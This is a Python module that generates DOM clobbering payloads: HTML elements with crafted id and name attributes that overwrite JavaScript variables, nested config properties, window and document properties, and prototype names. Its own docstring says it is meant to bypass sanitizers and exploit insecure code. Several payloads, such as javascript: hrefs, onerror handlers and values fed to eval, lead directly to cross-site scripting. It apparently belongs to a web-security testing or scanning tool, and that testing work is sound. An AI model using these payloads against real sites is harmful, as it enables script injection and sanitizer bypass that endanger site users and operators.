"""
DOM Clobbering attack techniques.

DOM Clobbering allows overwriting JavaScript variables/properties
using HTML elements with id/name attributes.

Used to bypass sanitizers and exploit insecure coding patterns.
"""

from dataclasses import dataclass
from typing import Iterator


@dataclass
class DOMClobbering:
    """Generate DOM clobbering payloads."""

    def clobber_variable(self, var_name: str) -> list[str]:
        """
        Clobber a JavaScript variable using HTML elements.

        Example: if code does `if (config) { ... }`
        We can make config truthy with <a id="config">
        """
        return [
            # Basic id clobbering
            f'<a id="{var_name}"></a>',
            f'<form id="{var_name}"></form>',
            f'<img id="{var_name}" name="{var_name}">',
            f'<input id="{var_name}" name="{var_name}">',

            # Clobber with specific value using name/href
            f'<a id="{var_name}" href="javascript:alert(1)"></a>',
            f'<a id="{var_name}" href="cid:alert(1)"></a>',

            # Double clobbering for nested properties
            f'<form id="{var_name}"><input id="x" value="test"></form>',
            f'<form id="{var_name}"><img id="src" name="src"></form>',
        ]

    def clobber_nested(self, parent: str, child: str) -> list[str]:
        """
        Clobber nested properties like `config.url` or `settings.apiKey`.

        Uses form + input/img with name attributes.
        """
        return [
            # Form + named child
            f'<form id="{parent}"><input id="{child}" name="{child}" value="javascript:alert(1)"></form>',
            f'<form id="{parent}"><img id="{child}" name="{child}"></form>',
            f'<form id="{parent}"><button id="{child}" name="{child}"></button></form>',

            # Object/embed
            f'<object id="{parent}"><param name="{child}" value="javascript:alert(1)"></object>',

            # Anchor chains
            f'<a id="{parent}"></a><a id="{parent}" name="{child}" href="javascript:alert(1)"></a>',
        ]

    def clobber_window_property(self, prop: str) -> list[str]:
        """
        Clobber window properties that might be checked.

        Common targets: window.CONFIG, window.SETTINGS, window.DEBUG
        """
        return [
            f'<img id="{prop}" name="{prop}">',
            f'<form id="{prop}"><input name="url" value="javascript:alert(1)"></form>',
            f'<a id="{prop}" href="javascript:alert(1)"></a>',

            # Using named form collection
            f'<form name="{prop}"><input name="url" value="x"></form>',
        ]

    def clobber_document_property(self) -> list[str]:
        """
        Clobber document properties.

        Can override document.domain checks in some browsers.
        """
        return [
            # document.x can be clobbered
            '<img id="x" name="domain">',
            '<form id="forms"><input name="0"></form>',
            '<a id="anchors" name="test"></a>',

            # Clobber location (doesn't work in modern browsers but worth trying)
            '<a id="location" href="javascript:alert(1)"></a>',
        ]

    def clobber_for_xss(self) -> list[str]:
        """
        Common DOM clobbering payloads that lead to XSS.

        These target common insecure coding patterns.
        """
        payloads = []

        # Pattern: if (window.config && config.debug) { eval(config.code) }
        payloads.extend([
            '<form id="config"><input id="debug" name="debug"><input id="code" name="code" value="alert(1)"></form>',
        ])

        # Pattern: element.innerHTML = untrusted.html
        payloads.extend([
            '<form id="untrusted"><textarea id="html" name="html"><img src=x onerror=alert(1)></textarea></form>',
        ])

        # Pattern: fetch(config.apiUrl)
        payloads.extend([
            '<a id="config" href="javascript:alert(1)"></a><a id="config" name="apiUrl" href="javascript:alert(1)"></a>',
        ])

        # Pattern: if (!window.sanitized) { ... dangerous ... }
        payloads.extend([
            '<img id="sanitized">',  # Makes truthy, might skip sanitization
        ])

        # Pattern: document.getElementById(userInput).innerHTML = ...
        payloads.extend([
            '<img id="__proto__">',  # Prototype pollution via clobbering
        ])

        # Pattern: someLib.config.url
        payloads.extend([
            '<form id="someLib"><form id="config"><input name="url" value="javascript:alert(1)"></form></form>',
        ])

        return payloads

    def prototype_pollution_via_clobbering(self) -> list[str]:
        """
        Use DOM clobbering to achieve prototype pollution effects.
        """
        return [
            # Clobber __proto__ (might work in edge cases)
            '<img id="__proto__" name="test">',

            # Clobber constructor
            '<form id="constructor"><input name="prototype"></form>',

            # Clobber Object
            '<img id="Object" name="assign">',
        ]

    def generate_all(self) -> Iterator[str]:
        """Generate all DOM clobbering payloads."""
        # Common variable names to clobber
        common_vars = [
            "config", "settings", "options", "data", "params",
            "GLOBALS", "CONFIG", "SETTINGS", "DEBUG", "ENV",
            "user", "admin", "auth", "token", "api",
        ]

        for var in common_vars:
            yield from self.clobber_variable(var)
            yield from self.clobber_window_property(var)

        # Common nested properties
        nested_props = [
            ("config", "url"),
            ("config", "apiKey"),
            ("settings", "debug"),
            ("options", "unsafe"),
            ("data", "html"),
        ]

        for parent, child in nested_props:
            yield from self.clobber_nested(parent, child)

        yield from self.clobber_document_property()
        yield from self.clobber_for_xss()
        yield from self.prototype_pollution_via_clobbering()


def get_dom_clobbering_payloads(max_payloads: int = 50) -> list[str]:
    """Convenience function to get DOM clobbering payloads."""
    clobbering = DOMClobbering()
    payloads = list(clobbering.generate_all())
    return payloads[:max_payloads]
